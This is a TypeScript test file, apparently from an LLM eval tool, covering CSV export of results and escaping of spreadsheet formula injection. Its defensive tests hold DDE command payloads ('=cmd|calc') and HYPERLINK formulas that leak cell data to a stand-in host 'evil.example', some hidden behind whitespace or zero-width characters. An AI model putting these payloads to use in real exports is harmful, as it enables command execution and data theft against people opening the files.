        prompts: [
          createCompletedPrompt('Prompt 1', {
            metrics: createPromptMetrics({
              namedScores: { accuracy: 0.7, relevance: 1.4 },
              namedScoresCount: { accuracy: 1, relevance: 2 },
            }),
          }),
        ],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { name: 'Alice' }, description: 'Test 1' },
            response: { output: 'First output' },
            success: true,
            score: 0.8,
            namedScores: { accuracy: 0.7, relevance: 0.9 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: {},
          },
          {
            testIdx: 1,
            promptIdx: 0,
            testCase: { vars: { name: 'Bob' }, description: 'Test 2' },
            response: { output: 'Second output' },
            success: true,
            score: 0.6,
            namedScores: { relevance: 0.5 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: {},
          },
        ],
      });

      const lines = csv.split('\n').filter((line) => line.trim());
      expect(lines[0]).toContain('Metric: accuracy');
      expect(lines[0]).toContain('Metric: relevance');
      expect(lines[1]).toContain('0.70,0.90');
      expect(lines[2]).toContain(',0.50');
    });

    it('escapes formula-injection payloads when streaming CSV', async () => {
      const csv = await runStreamEvalCsv({
        vars: ['name'],
        prompts: [createCompletedPrompt('Prompt 1', {})],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { name: '=cmd|calc' }, description: 'Test 1' },
            response: { output: '=1+2' },
            success: false,
            score: 0,
            namedScores: {},
            failureReason: ResultFailureReason.ASSERT,
            gradingResult: null,
            metadata: {},
          },
        ],
      });

      const dataRow = (parseCsv(csv) as string[][])[1];
      expect(dataRow).toContain("'=cmd|calc");
      expect(dataRow).toContain("'=1+2");
      // No raw formula trigger survives into a streamed cell.
      expect(dataRow.every((cell) => !/^[=@]/.test(cell))).toBe(true);
    });

    it('should omit derived/aggregate-only metric columns when streaming', async () => {
      // Derived metrics live on `metrics.namedScores` but not on
      // `metrics.namedScoresCount`, and never appear on per-row outputs. The
      // streaming CSV must skip them so it stays consistent with the WebUI path,
      // which scans row outputs (see collectNamedScoreNamesByPrompt).
      const csv = await runStreamEvalCsv({
        vars: ['name'],
        prompts: [
          createCompletedPrompt('Prompt 1', {
            metrics: createPromptMetrics({
              namedScores: { accuracy: 0.8, derived_score: 1.6 },
              namedScoresCount: { accuracy: 1 },
            }),
          }),
        ],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { name: 'Alice' } },
            response: { output: 'Alice output' },
            success: true,
            score: 0.8,
            namedScores: { accuracy: 0.8 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: {},
          },
        ],
      });

      const header = csv.split('\n')[0];
      expect(header).toContain('Metric: accuracy');
      expect(header).not.toContain('Metric: derived_score');
    });

    it('should backfill metric columns from row outputs when namedScoresCount is missing (legacy evals)', async () => {
      // Older eval rows persisted before `namedScoresCount` was reliably populated,
      // and external v4 imports via POST /api/eval that don't backfill the count,
      // still need their per-row metric columns to appear in CSV exports.
      const csv = await runStreamEvalCsv({
        vars: ['name'],
        prompts: [
          createLegacyCompletedPrompt('Prompt 1', {
            namedScores: { accuracy: 0.8, fluency: 0.6 },
          }),
        ],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { name: 'Alice' } },
            response: { output: 'Alice output' },
            success: true,
            score: 0.7,
            namedScores: { accuracy: 0.8, fluency: 0.6 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: {},
          },
        ],
      });

      const header = csv.split('\n')[0];
      expect(header).toContain('Metric: accuracy');
      expect(header).toContain('Metric: fluency');
    });

    it('should keep metric discovery focused for modern evals with empty namedScoresCount', async () => {
      // Modern eval where no test uses `metric:` — `namedScoresCount` is
      // present-but-empty. The description discovery pass must not invent
      // metric columns.
      const prompts = [
        createCompletedPrompt('Prompt 1', {
          metrics: createPromptMetrics({
            namedScores: {},
            namedScoresCount: {},
          }),
        }),
      ];
      const chunks: string[] = [];
      let fetchPasses = 0;
      await streamEvalCsv(
        {
          vars: ['n'],
          prompts,
          fetchResultsBatched: async function* () {
            fetchPasses += 1;
            yield [
              {
                testIdx: 0,
                promptIdx: 0,
                testCase: { vars: { n: 'a' } },
                response: { output: 'a' },
                success: true,
                score: 1,
                namedScores: {},
                failureReason: ResultFailureReason.NONE,
                gradingResult: null,
                metadata: {},
              },
            ];
          },
        } as unknown as Eval,
        {
          isRedteam: false,
          write: (data: string) => {
            chunks.push(data);
          },
        },
      );

      const header = chunks.join('').split('\n')[0];
      expect(header).not.toContain('Metric:');
      expect(fetchPasses).toBe(2);
    });

    it('should include descriptions that first appear in a later batch', async () => {
      const prompts = [
        createCompletedPrompt('Prompt 1', {
          metrics: createPromptMetrics({ namedScores: {}, namedScoresCount: {} }),
        }),
      ];
      const chunks: string[] = [];
      await streamEvalCsv(
        {
          vars: ['n'],
          prompts,
          fetchResultsBatched: async function* () {
            yield [
              {
                testIdx: 0,
                promptIdx: 0,
                testCase: { vars: { n: 'a' } },
                response: { output: 'a' },
                success: true,
                score: 1,
                namedScores: {},
                failureReason: ResultFailureReason.NONE,
                gradingResult: null,
                metadata: {},
              },
            ];
            yield [
              {
                testIdx: 100,
                promptIdx: 0,
                testCase: { vars: { n: 'b' }, description: 'Later description' },
                response: { output: 'b' },
                success: true,
                score: 1,
                namedScores: {},
                failureReason: ResultFailureReason.NONE,
                gradingResult: null,
                metadata: {},
              },
            ];
          },
        } as unknown as Eval,
        {
          isRedteam: false,
          write: (data: string) => {
            chunks.push(data);
          },
        },
      );

      const csv = chunks.join('');
      expect(csv.split('\n')[0]).toContain('Description');
      expect(csv).toContain('Later description');
    });

    it('should detect metric names that first appear in a later batch on legacy evals', async () => {
      // EvalResult.findManyByEvalIdBatched yields batches of 100 testIdx, so a
      // metric introduced past the first batch would be missed by a first-batch
      // scan. Discovery must cover all batches without retaining all CSV rows.
      const prompts = [
        createLegacyCompletedPrompt('Prompt 1', {
          namedScores: { early_metric: 1.0 },
        }),
      ];
      const chunks: string[] = [];
      let fetchPasses = 0;
      const streamedBeforeSecondBatch: boolean[] = [];
      await streamEvalCsv(
        {
          vars: ['n'],
          prompts,
          fetchResultsBatched: async function* () {
            fetchPasses += 1;
            yield [
              {
                testIdx: 0,
                promptIdx: 0,
                testCase: { vars: { n: 'a' } },
                response: { output: 'a' },
                success: true,
                score: 1,
                namedScores: { early_metric: 1.0 },
                failureReason: ResultFailureReason.NONE,
                gradingResult: null,
                metadata: {},
              },
            ];
            if (fetchPasses === 2) {
              streamedBeforeSecondBatch.push(chunks.length > 1);
            }
            yield [
              {
                testIdx: 100,
                promptIdx: 0,
                testCase: { vars: { n: 'b' } },
                response: { output: 'b' },
                success: true,
                score: 1,
                namedScores: { early_metric: 1.0, late_metric: 0.5 },
                failureReason: ResultFailureReason.NONE,
                gradingResult: null,
                metadata: {},
              },
            ];
          },
        } as unknown as Eval,
        {
          isRedteam: false,
          write: (data: string) => {
            chunks.push(data);
          },
        },
      );

      const csv = chunks.join('');
      const header = csv.split('\n')[0];
      expect(header).toContain('Metric: early_metric');
      expect(header).toContain('Metric: late_metric');
      expect(fetchPasses).toBe(2);
      expect(streamedBeforeSecondBatch).toEqual([true]);
    });

    it('should omit derived/aggregate-only metric columns even on legacy evals without namedScoresCount', async () => {
      // Reviewer scenario: an imported eval whose `metrics.namedScores` has both
      // row-contributed metrics and an aggregate-only derived metric, but no
      // `namedScoresCount`. The legacy backfill must still match the WebUI by
      // scanning row outputs (which never carry derived metrics).
      const csv = await runStreamEvalCsv({
        vars: ['name'],
        prompts: [
          createLegacyCompletedPrompt('Prompt 1', {
            namedScores: { accuracy: 0.8, aggregate_only_average: 0.5 },
          }),
        ],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { name: 'Alice' } },
            response: { output: 'Alice output' },
            success: true,
            score: 0.8,
            namedScores: { accuracy: 0.8 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: {},
          },
        ],
      });

      const header = csv.split('\n')[0];
      expect(header).toContain('Metric: accuracy');
      expect(header).not.toContain('Metric: aggregate_only_average');
    });

    it('should produce headers consistent with evalTableToCsv for the same data', async () => {
      // Locks the docstring invariant that streamEvalCsv (CLI) and evalTableToCsv
      // (WebUI) produce the same column layout for the same eval data.
      const sharedPrompt = createCompletedPrompt('Explain {{topic}}', {
        provider: 'echo',
        metrics: createPromptMetrics({
          namedScores: { clarity: 0.9, accuracy: 0.8, derived_avg: 0.85 },
          namedScoresCount: { clarity: 1, accuracy: 1 },
        }),
      });

      const cliCsv = await runStreamEvalCsv({
        vars: ['topic'],
        prompts: [sharedPrompt],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { topic: 'gravity' } },
            response: { output: 'gravity output' },
            success: true,
            score: 0.9,
            namedScores: { clarity: 0.9, accuracy: 0.8 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: {},
          },
        ],
      });

      const webCsv = evalTableToCsv({
        head: { vars: ['topic'], prompts: [sharedPrompt] },
        body: [
          {
            test: { vars: { topic: 'gravity' } },
            testIdx: 0,
            vars: ['gravity'],
            outputs: [
              {
                pass: true,
                text: 'gravity output',
                score: 0.9,
                namedScores: { clarity: 0.9, accuracy: 0.8 },
              } as unknown as EvaluateTableOutput,
            ],
          },
        ],
      });

      expect(cliCsv.split('\n')[0]).toBe(webCsv.split('\n')[0]);
    });

    it('should keep redteam metadata columns aligned when metric columns are present', async () => {
      const csv = await runStreamEvalCsv({
        vars: ['name'],
        prompts: [
          createCompletedPrompt('Prompt 1', {
            metrics: createPromptMetrics({
              namedScores: { accuracy: 0.8, relevance: 0.7 },
              namedScoresCount: { accuracy: 1, relevance: 1 },
            }),
          }),
        ],
        results: [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { name: 'Alice' } },
            response: { output: 'Alice output' },
            success: true,
            score: 0.8,
            namedScores: { accuracy: 0.8, relevance: 0.7 },
            failureReason: ResultFailureReason.NONE,
            gradingResult: null,
            metadata: { pluginId: 'plg', strategyId: 'strat', sessionId: 'sess' },
          },
        ],
        isRedteam: true,
      });

      const [headerCols, rowCols] = parseCsv(csv) as string[][];

      // Header and row must have the same column count so redteam metadata
      // columns (pluginId, strategyId, sessionId, …) line up with their headers.
      expect(rowCols).toHaveLength(headerCols.length);
      const pluginIdHeaderIdx = headerCols.indexOf('pluginId');
      const strategyIdHeaderIdx = headerCols.indexOf('strategyId');
      expect(pluginIdHeaderIdx).toBeGreaterThan(-1);
      expect(rowCols[pluginIdHeaderIdx]).toBe('plg');
      expect(rowCols[strategyIdHeaderIdx]).toBe('strat');
    });

    it('should handle multiple test cases with out-of-order results', async () => {
      const mockResults = [
        // Test 1 results (out of order)
        {
          testIdx: 0,
          promptIdx: 1,
          testCase: { vars: { name: 'Alice' } },
          response: { output: 'Alice-P2' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
        {
          testIdx: 0,
          promptIdx: 0,
          testCase: { vars: { name: 'Alice' } },
          response: { output: 'Alice-P1' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
        // Test 2 results (out of order)
        {
          testIdx: 1,
          promptIdx: 1,
          testCase: { vars: { name: 'Bob' } },
          response: { output: 'Bob-P2' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
        {
          testIdx: 1,
          promptIdx: 0,
          testCase: { vars: { name: 'Bob' } },
          response: { output: 'Bob-P1' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
      ];

      const mockEval = {
        vars: ['name'],
        prompts: [{ label: 'Prompt 1' } as Prompt, { label: 'Prompt 2' } as Prompt],
        fetchResultsBatched: async function* () {
          yield mockResults;
        },
      } as unknown as Eval;

      const chunks: string[] = [];
      await streamEvalCsv(mockEval, {
        isRedteam: false,
        write: (data: string) => {
          chunks.push(data);
        },
      });

      const csv = chunks.join('');
      const lines = csv.split('\n').filter((line) => line.trim());

      // Should have header + 2 data rows
      expect(lines.length).toBe(3);

      // Check Alice row has correct ordering
      const aliceLine = lines.find((l) => l.includes('Alice'));
      expect(aliceLine).toBeDefined();
      const aliceP1Idx = aliceLine!.indexOf('Alice-P1');
      const aliceP2Idx = aliceLine!.indexOf('Alice-P2');
      expect(aliceP1Idx).toBeLessThan(aliceP2Idx);

      // Check Bob row has correct ordering
      const bobLine = lines.find((l) => l.includes('Bob'));
      expect(bobLine).toBeDefined();
      const bobP1Idx = bobLine!.indexOf('Bob-P1');
      const bobP2Idx = bobLine!.indexOf('Bob-P2');
      expect(bobP1Idx).toBeLessThan(bobP2Idx);
    });
  });
});

describe('escapeCsvFormula', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
    ['+1+1', "'+1+1"],
    ['-1+1', "'-1+1"],
    ['-2+cmd', "'-2+cmd"],
  ])('prefixes formula trigger %p -> %p', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });

  it.each([
    ['\t=danger', "'\t=danger"],
    ['\r=danger', "'\r=danger"],
    ['  =danger', "'  =danger"],
    ['\t@SUM(A1)', "'\t@SUM(A1)"],
    ['\r-1+1', "'\r-1+1"],
    ['\n\t =evil', "'\n\t =evil"],
  ])('treats leading whitespace/control before a trigger as a formula (%p)', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });

  it.each([
    ['\u200B=1+1', "'\u200B=1+1"],
    ['\u200C@SUM(A1)', "'\u200C@SUM(A1)"],
    ['\u200D=cmd', "'\u200D=cmd"],
  ])('escapes triggers hidden behind zero-width characters (%p)', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });

  it.each([
    ['-Infinity', "'-Infinity"],
    ['+Infinity', "'+Infinity"],
    ['-1e400', "'-1e400"],
  ])('escapes non-finite numeric-looking values (%p)', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });

  it.each([
    [
      '=HYPERLINK("https://evil.example?x="&A1,"click")',
      '\'=HYPERLINK("https://evil.example?x="&A1,"click")',
    ],
    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
  ])('neutralizes real exfiltration/command payloads (%p)', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });

  it.each([
    ['-5', '-5'],
    ['-5.25', '-5.25'],
    ['-1e3', '-1e3'],
    ['+5', '+5'],
    ['+3.14', '+3.14'],
  ])('leaves legitimate numbers untouched (%p)', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });

  it.each([
    ['hello world', 'hello world'],
    ['5-3', '5-3'],
    ['a=b', 'a=b'],
    ['user@example.com', 'user@example.com'],
    ['', ''],
    ['   ', '   '],
    ['\t\t', '\t\t'],
  ])('leaves non-formula values untouched (%p)', (input, expected) => {
    expect(escapeCsvFormula(input)).toBe(expected);
  });
});

describe('evalTableToCsv formula injection (CWE-1236)', () => {
  const buildFormulaTable = () => ({
    head: {
      vars: ['input'],
      prompts: [createCompletedPrompt('{{input}}', { provider: 'echo', label: 'Prompt 1' })],
    },
    body: [
      {
        test: { vars: { input: '=cmd|calc' }, description: '=danger' },
        testIdx: 0,
        vars: ['=cmd|calc'],
        outputs: [
          {
            pass: false,
            text: '=HYPERLINK("http://evil.example","click")',
            failureReason: ResultFailureReason.ASSERT,
            gradingResult: { pass: false, reason: '@SUM(A1)', comment: 'plain comment' },
          } as EvaluateTableOutput,
        ],
      },
    ],
  });

  it('prefixes attacker-influenced cells so spreadsheets do not execute them', () => {
    const [headerRow, dataRow] = parseCsv(evalTableToCsv(buildFormulaTable())) as string[][];

    expect(dataRow[0]).toBe("'=danger"); // description
    expect(dataRow[1]).toBe("'=cmd|calc"); // var
    expect(dataRow[2]).toBe('\'=HYPERLINK("http://evil.example","click")'); // model output

    const reasonIdx = headerRow.indexOf('Grader Reason');
    expect(dataRow[reasonIdx]).toBe("'@SUM(A1)");

    // A benign comment is left untouched.
    const commentIdx = headerRow.indexOf('Comment');
    expect(dataRow[commentIdx]).toBe('plain comment');
  });

  it('leaves cells raw when PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING is set', () => {
    vi.stubEnv('PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING', 'true');
    try {
      const [, dataRow] = parseCsv(evalTableToCsv(buildFormulaTable())) as string[][];
      expect(dataRow[1]).toBe('=cmd|calc');
      expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
    } finally {
      vi.unstubAllEnvs();
    }
  });

  it('uses the evaluation config env before process.env', () => {
    vi.stubEnv('PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING', 'true');
    try {
      const [, dataRow] = parseCsv(
        evalTableToCsv(buildFormulaTable(), {
          env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'false' },
        }),
      ) as string[][];

      expect(dataRow[1]).toBe("'=cmd|calc");
      expect(dataRow[2]).toBe('\'=HYPERLINK("http://evil.example","click")');
    } finally {
      vi.unstubAllEnvs();
    }
  });

  it('uses config.env for full-table evaluation exports', async () => {
    const csv = await generateEvalCsv({
      config: { env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'true' } },
      getTablePage: vi.fn().mockResolvedValue(buildFormulaTable()),
    } as unknown as Eval);
    const [, dataRow] = parseCsv(csv) as string[][];

    expect(dataRow[1]).toBe('=cmd|calc');
    expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
  });

  it('uses config.env for streaming evaluation exports', async () => {
    const mockEval = {
      config: { env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'true' } },
      vars: ['input'],
      prompts: [createCompletedPrompt('{{input}}', { provider: 'echo', label: 'Prompt 1' })],
      fetchResultsBatched: async function* () {
        yield [
          {
            testIdx: 0,
            promptIdx: 0,
            testCase: { vars: { input: '=cmd|calc' }, description: '=danger' },
            response: { output: '=HYPERLINK("http://evil.example","click")' },
            success: false,
            score: 0,
            namedScores: {},
            failureReason: ResultFailureReason.ASSERT,
            gradingResult: { pass: false, reason: '@SUM(A1)', comment: 'plain comment' },
            metadata: {},
          },
        ];
      },
    } as unknown as Eval;
    const chunks: string[] = [];

    await streamEvalCsv(mockEval, {
      write: (data) => {
        chunks.push(data);
      },
    });
    const [, dataRow] = parseCsv(chunks.join('')) as string[][];

    expect(dataRow[1]).toBe('=cmd|calc');
    expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
  });

  it('escapes formula triggers in header cells (var name and bare prompt label)', () => {
    // A var named "=evil" and a provider-less prompt label "=cmd()" both land in the
    // header row; the csvStringify-boundary escaping must cover headers, not just body.
    const table = {
      head: {
        vars: ['=evilVar'],
        prompts: [createCompletedPrompt('{{x}}', { provider: '', label: '=cmd()' })],
      },
      body: [
        {
          test: { vars: { '=evilVar': 'v' }, description: 'd' },
          testIdx: 0,
          vars: ['v'],
          outputs: [{ pass: true, text: 'ok' } as EvaluateTableOutput],
        },
      ],
    };

    const [headerRow] = parseCsv(evalTableToCsv(table)) as string[][];
    expect(headerRow).toContain("'=evilVar");
    expect(headerRow).toContain("'=cmd()");
  });
});
